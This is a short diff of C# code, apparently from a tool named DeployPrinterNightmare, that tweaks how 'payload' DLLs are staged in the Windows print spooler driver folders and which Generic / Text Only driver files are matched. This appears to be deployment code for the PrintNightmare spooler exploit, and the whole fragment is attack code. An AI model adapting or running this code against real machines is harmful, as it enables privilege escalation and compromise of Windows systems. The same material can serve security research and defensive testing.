@@ -198,13 +198,13 @@ namespace DeployPrinterNightmare
 
             string driversPath = Environment.SystemDirectory + @"\spool\drivers";
 
-            CopyFile(Environment.SystemDirectory + @"\mscms.dll", driversPath + $@"\{payloadName}");
+            CopyFile(Environment.SystemDirectory + @"\mscms.dll", Environment.SystemDirectory + $@"\{payloadName}");
             CopyFile(_64BitPayloadDllPath, driversPath + $@"\x64\3\{payloadName}");
             CopyFile(_32BitPayloadDllPath, driversPath + $@"\W32X86\3\{payloadName}");
 
             //Matching the Generic / Text Only driver
             string driverFileName = "UNIDRV.DLL";
-            string dataFileName = "TTY.GPD";
+            string dataFileName = "unishare.GPD";
             string configFileName = "UNIDRVUI.DLL";
             string helpFileName = "UNIDRV.HLP";
 
